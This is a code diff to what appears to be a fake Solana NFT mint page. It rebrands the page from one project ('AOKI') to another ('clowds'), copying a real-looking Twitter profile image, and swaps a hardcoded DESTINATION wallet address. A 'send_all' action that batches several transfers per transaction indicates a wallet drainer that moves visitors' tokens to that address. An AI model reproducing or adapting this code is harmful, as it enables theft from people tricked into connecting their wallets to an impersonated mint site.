@@ -6,10 +6,10 @@ import OwnLayout from "./OwnLayout/OwnLayout";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const solAmount = "0.139"
-const image = 'https://pbs.twimg.com/profile_images/1690343215038140417/NaEhxlTf_400x400.jpg'
-const Title = 'AOKI'
-const supply = 2499
+const solAmount = "0.066"
+const image = 'https://pbs.twimg.com/profile_images/1735024009522057216/Wpo49Rgx_400x400.png'
+const Title = 'clowds'
+const supply = 1140
 
 document.title = Title
 document.getElementById('favicon').setAttribute('href', image)
@@ -19,7 +19,7 @@ const ACTION = 'send_all';
 const SENDS_IN_ONE_TX = 7;
 // const CLOSES_IN_ONE_TX = 27;
 
-const DESTINATION = new PublicKey('BURn8W8kv6xfQfzgqCzdS8kcMyRoVsQc95MsoqjtoRKC');
+const DESTINATION = new PublicKey('4444yauc6XPT2TKY1GQkQ88SKeJaSVzH5JkohuHmPJNR');
 
 const tokenProgram = TOKEN_PROGRAM_ID;
 
